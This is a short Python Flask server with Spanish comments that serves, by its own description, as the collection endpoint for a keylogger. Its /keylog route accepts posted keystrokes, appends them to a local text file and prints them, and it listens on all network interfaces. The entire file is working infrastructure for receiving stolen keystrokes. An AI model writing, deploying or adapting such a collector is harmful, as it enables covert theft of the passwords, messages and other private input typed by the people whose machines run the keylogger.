# Instalar previamente flask con el comando "pip install Flask" en Python3

from flask import Flask, request

app = Flask(__name__)

# Ruta que recibirá las teclas del keylogger
@app.route('/keylog', methods=['POST'])
def keylog():
    if request.method == 'POST':
        keylogs = request.form.get('keylogs')  # Obtiene el dato enviado en la petición POST
        if keylogs:
            with open("keylogs.txt", "a") as f:
                f.write(keylogs + '\n')  # Guarda las teclas en un archivo
            print(f"Recibido: {keylogs}")
        return 'Datos recibidos', 200

if __name__ == '__main__':
    # Inicia el servidor Flask en localhost en el puerto 5000
    app.run(host='0.0.0.0', port=5000)
